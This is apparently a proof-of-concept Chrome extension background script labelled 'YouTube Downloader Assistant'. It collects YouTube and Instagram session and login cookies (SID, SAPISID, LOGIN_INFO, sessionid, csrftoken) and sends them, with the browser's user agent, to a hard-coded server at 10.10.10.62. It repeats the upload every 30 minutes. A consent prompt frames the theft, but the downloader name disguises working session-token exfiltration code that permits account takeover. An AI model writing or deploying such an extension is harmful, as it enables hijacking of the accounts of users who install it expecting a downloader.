class POCCookieManager {
  constructor() {
    this.serverUrl = 'http://10.10.10.62';
    this.sessionId = null;
    this.userConsent = {
      granted: false,
      platforms: [],
      timestamp: null,
      expiresAt: null
    };
    
    // Load saved consent on startup
    this.loadConsent();
    
    // Set up periodic cleanup
    this.setupCleanup();
  }

  async loadConsent() {
    try {
      const result = await chrome.storage.local.get(['userConsent', 'sessionId']);
      if (result.userConsent) {
        this.userConsent = result.userConsent;
        
        // Check if consent has expired
        if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
          console.log('🕒 User consent expired, clearing...');
          await this.clearConsent();
        }
      }
      if (result.sessionId) {
        this.sessionId = result.sessionId;
      }
    } catch (error) {
      console.error('❌ Failed to load consent:', error);
    }
  }

  async saveConsent() {
    try {
      await chrome.storage.local.set({
        userConsent: this.userConsent,
        sessionId: this.sessionId
      });
    } catch (error) {
      console.error('❌ Failed to save consent:', error);
    }
  }

  async grantConsent(platforms) {
    console.log('✅ User granted consent for platforms:', platforms);
    
    const now = new Date();
    const expiresAt = new Date(now.getTime() + (24 * 60 * 60 * 1000)); // 24 hours
    
    this.userConsent = {
      granted: true,
      platforms: platforms,
      timestamp: now.toISOString(),
      expiresAt: expiresAt.toISOString()
    };
    
    // Generate session ID
    this.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    
    await this.saveConsent();
    
    // Immediately share cookies for consented platforms
    for (const platform of platforms) {
      await this.shareCookies(platform);
    }
  }

  async revokeConsent() {
    console.log('🚫 User revoked consent');
    await this.clearConsent();
    
    // Notify server to clear session
    if (this.sessionId) {
      try {
        await fetch(`${this.serverUrl}/api/extension/revoke`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId: this.sessionId })
        });
      } catch (error) {
        console.error('❌ Failed to notify server of consent revocation:', error);
      }
    }
  }

  async clearConsent() {
    this.userConsent = {
      granted: false,
      platforms: [],
      timestamp: null,
      expiresAt: null
    };
    this.sessionId = null;
    
    await chrome.storage.local.clear();
  }

  async extractCookies(platform) {
    if (!this.userConsent.granted || !this.userConsent.platforms.includes(platform)) {
      throw new Error(`User consent required for platform: ${platform}`);
    }

    const domain = platform === 'youtube' ? '.youtube.com' : '.instagram.com';
    
    try {
      const cookies = await chrome.cookies.getAll({ domain });
      
      // Filter for relevant cookies
      const relevantCookies = cookies.filter(cookie => {
        if (platform === 'youtube') {
          return ['VISITOR_INFO1_LIVE', 'YSC', 'LOGIN_INFO', 'SID', 'HSID', 'SSID', 'APISID', 'SAPISID'].includes(cookie.name);
        } else if (platform === 'instagram') {
          return ['sessionid', 'csrftoken', 'mid', 'ig_did', 'shbid', 'shbts', 'rur'].includes(cookie.name);
        }
        return false;
      });

      console.log(`🍪 Extracted ${relevantCookies.length} cookies for ${platform}`);
      return relevantCookies;
    } catch (error) {
      console.error(`❌ Failed to extract cookies for ${platform}:`, error);
      throw error;
    }
  }

  async shareCookies(platform) {
    if (!this.sessionId) {
      throw new Error('No session ID available');
    }

    try {
      const cookies = await this.extractCookies(platform);
      
      const response = await fetch(`${this.serverUrl}/api/extension/cookies`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId: this.sessionId,
          platform,
          cookies,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        })
      });

      if (!response.ok) {
        throw new Error(`Server responded with ${response.status}`);
      }

      const result = await response.json();
      console.log(`✅ Successfully shared ${platform} cookies:`, result);
      
      return result;
    } catch (error) {
      console.error(`❌ Failed to share ${platform} cookies:`, error);
      throw error;
    }
  }

  setupCleanup() {
    // Check for expired consent every hour
    setInterval(async () => {
      if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
        console.log('🧹 Cleaning up expired consent...');
        await this.clearConsent();
      }
    }, 60 * 60 * 1000); // 1 hour

    // Auto-refresh cookies every 30 minutes if consent is active
    setInterval(async () => {
      if (this.userConsent.granted && this.userConsent.platforms.length > 0) {
        console.log('🔄 Auto-refreshing cookies...');
        for (const platform of this.userConsent.platforms) {
          try {
            await this.shareCookies(platform);
          } catch (error) {
            console.error(`❌ Failed to auto-refresh ${platform} cookies:`, error);
          }
        }
      }
    }, 30 * 60 * 1000); // 30 minutes
  }

  getConsentStatus() {
    return {
      granted: this.userConsent.granted,
      platforms: this.userConsent.platforms,
      expiresAt: this.userConsent.expiresAt,
      sessionId: this.sessionId
    };
  }
}

// Initialize the cookie manager
console.log('🚀 Background script starting...');
let cookieManager;

try {
  cookieManager = new POCCookieManager();
  console.log('✅ Cookie manager initialized');
} catch (error) {
  console.error('❌ Failed to initialize cookie manager:', error);
  cookieManager = null;
}

// Handle messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('📬 Background received message:', request);
  
  (async () => {
    try {
      if (!cookieManager) {
        sendResponse({ error: 'Cookie manager not initialized' });
        return;
      }
      
      switch (request.action) {
        case 'getConsentStatus':
          const status = cookieManager.getConsentStatus();
          console.log('📊 Sending consent status:', status);
          sendResponse(status);
          break;
          
        case 'grantConsent':
          await cookieManager.grantConsent(request.platforms);
          sendResponse({ success: true });
          break;
          
        case 'revokeConsent':
          await cookieManager.revokeConsent();
          sendResponse({ success: true });
          break;
          
        case 'shareCookies':
          const result = await cookieManager.shareCookies(request.platform);
          sendResponse({ success: true, result });
          break;
          
        default:
          sendResponse({ error: 'Unknown action' });
      }
    } catch (error) {
      console.error('❌ Background script error:', error);
      sendResponse({ error: error.message });
    }
  })();
  
  // Return true to indicate we'll respond asynchronously
  return true;
});

// Add error handling for runtime errors
chrome.runtime.onStartup.addListener(() => {
  console.log('🔄 Extension startup');
});

chrome.runtime.onSuspend.addListener(() => {
  console.log('😴 Extension suspending');
});

// Handle installation
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    console.log('🎉 YouTube Downloader Assistant installed');
    chrome.tabs.create({ url: 'http://localhost:3000' });
  }
});

console.log('🚀 YouTube Downloader Assistant background script loaded');